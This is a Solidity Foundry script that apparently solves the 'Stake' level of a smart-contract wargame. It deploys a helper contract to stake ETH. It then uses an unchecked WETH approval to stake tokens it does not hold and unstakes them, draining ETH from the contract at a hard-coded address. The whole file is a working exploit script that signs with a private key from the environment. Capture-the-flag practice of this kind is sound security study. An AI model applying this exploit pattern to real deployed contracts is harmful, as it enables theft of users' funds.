// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Stake.sol";
import {Script} from "forge-std/Script.sol";

contract AttackerContract {
    Stake stakeInstance;

    constructor (address _address) {
        stakeInstance = Stake(_address);
    }

    function StakeETH() public payable {
        stakeInstance.StakeETH{ value: msg.value }();
    }
}

contract StakeAttack is Script {
    Stake public stakeInstance = Stake(0x4b286F79f4dB5A85FE5c4157F025f59fc86F4Be6);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        uint256 amount = 0.0011 ether + 1;

        AttackerContract attackerContract = new AttackerContract(address(stakeInstance));

        attackerContract.StakeETH{ value: amount + 1 }();

        (bool success,) = address(stakeInstance.WETH()).call(abi.encodeWithSignature("approve(address,uint256)", address(stakeInstance), type(uint256).max));

        require(success, "Failed");
        
        stakeInstance.StakeWETH(amount);
        stakeInstance.Unstake(amount);

        vm.stopBroadcast();
    }
}
